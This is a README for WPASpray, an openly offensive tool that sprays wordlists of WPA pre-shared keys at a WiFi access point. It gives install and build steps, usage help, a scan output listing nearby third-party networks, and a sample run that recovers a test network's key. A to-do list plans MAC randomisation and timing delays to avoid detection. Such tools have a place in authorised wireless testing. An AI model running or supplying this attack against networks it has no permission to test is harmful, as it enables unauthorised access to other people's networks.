# WPASpray

A WiFi attack vector for spraying WPA Pre-Shared Keys against an access point.

## Installation

1. Navigate to the [releases page](../releases) and donwload the latest .deb
2. Run ```apt install ./wpaspray-1.0-x86_64.deb```

### Note

When installing in Kali, as root, if you see the error ```N: Download is performed unsandboxed as root as file ...``` it is safe to ignore.

This is just apt saying that it doesn't have an ```_apt``` user to download and install the .deb file with that is non-root, non-login, and sandboxed.
If this error concerns you, you can follow these alternate installation instructions:

1. Run ```dpkg -i wpaspray-1.0-x86_64.deb```
2. Run ```apt install -f```

And you should encounter no errors.

## Examples

#### Usage
```
~# wpaspray -h
usage: wpaspray [-h] [-s] [-i INTERFACE] [-w WORDLIST] [-b BSSID] [-t TIMEOUT]             

WPASpray, an attack vector for spraying WPA Pre-Shared Keys against an access point.                                      

optional arguments:                         
  -h, --help            show this help message and exit                                 
  -s, --scan            Scan for available access points.                               
  -i INTERFACE, --interface INTERFACE       
                        Interface to use.   
  -w WORDLIST, --wordlist WORDLIST          
                        Wordlist to use. 1 password/phrase per line. Passwords          
                        less than 8 characters or lines starting with a '#'             
                        will be ignored.    
  -b BSSID, --bssid BSSID                   
                        BSSID of the target access point                                
  -t TIMEOUT, --timeout TIMEOUT             
                        Timeout to wait for a handshake with each password              
                        attempt. Default is no timeout.
```

#### Scan for available target access points:
```
~# wpaspray -i wlan1 -s
[ INIT ] Initializing...
[ INIT ] Complete.
[ SCAN ] Scanning for access points...
[ SCAN ] Complete.
[ SCAN ] Printing results...
      BSSID                     SSID               FREQUENCY  SIGNAL    TYPE   KEYMGMT 
---------------------------------------------------------------------------------------
E4:8D:8C:5C:07:CB  TestingWPA                      2.4 Ghz    -23 dBm  WPA2    wpa-psk   
DC:EF:09:A6:06:22  NETGEAR73                       2.4 Ghz    -61 dBm  WPA2    wpa-psk   
F0:F2:49:8B:90:48  CGNM-9048                       2.4 Ghz    -63 dBm  WPA2    wpa-psk   
64:77:7D:9F:B6:D8  CGNM-B6D8                       2.4 Ghz    -69 dBm  WPA2    wpa-psk   
00:FC:8D:93:0A:18  CGNM-0A18                       2.4 Ghz    -71 dBm  WPA2    wpa-psk   
C0:C1:C0:E6:2B:BD  Bright                          2.4 Ghz    -75 dBm  WPA2    wpa-psk   
84:94:8C:BF:FA:38  CGN-FA30                        2.4 Ghz    -77 dBm  WPA2    wpa-psk
```

#### Target a specific AP
```
~# wpaspray -i wlan0 -b e4:8d:8c:5c:07:cb -w wordlist.txt
[ INIT ] Initializing...
[ INIT ] Complete.    
[ SCAN ] Scanning for access points...      
[ SCAN ] Complete.    
[ SPRAY ] Starting password spray...        
[ SPRAY ] Target: BSSID 'E4:8D:8C:5C:07:CB'  SSID: 'TestingWPA'  Signal: -17 dBm        
[ SPRAY ] Trying psk: 'Password01!'         
[ SPRAY ] authenticating                    
[ SPRAY ] associating 
[ SPRAY ] 4way_handshake                    
[ SPRAY ] disconnected
[ SPRAY ] scanning    
[ SPRAY ] Trying psk: 'Princess'            
[ SPRAY ] authenticating                    
[ SPRAY ] associating 
[ SPRAY ] 4way_handshake                    
[ SPRAY ] disconnected
[ SPRAY ] scanning    
[ SPRAY ] Trying psk: 'TestPass12345!'      
[ SPRAY ] authenticating                    
[ SPRAY ] associating 
[ SPRAY ] 4way_handshake                    
[ SPRAY ] completed   
[ SPRAY ] ############# SUCCESS! #############                                          
[ SPRAY ] # BSSID: 'E4:8D:8C:5C:07:CB'       #                                          
[ SPRAY ] # SSID: 'TestingWPA'               #                                          
[ SPRAY ] # Pre-Shared Key: 'TestPass12345!' #                                          
[ SPRAY ] ####################################
```

## Building From Source

If you choose to build the package yourself you can follow the guide below.

1. Clone the repository. `git clone github.com/nodocify/wpaspray.git`
2. Make sure you have EPM installed. `sudo apt install epm`
3. Navigate into the wpaspray directory and run `epm -f deb -v wpaspray`
4. EPM will create a new directory named after your kernel. Deb is located inside.

## To Do
* Have option to randomize MAC every X number of PSK attempts.
* Option to create a delay between attempts. Helpful for lower end access points.
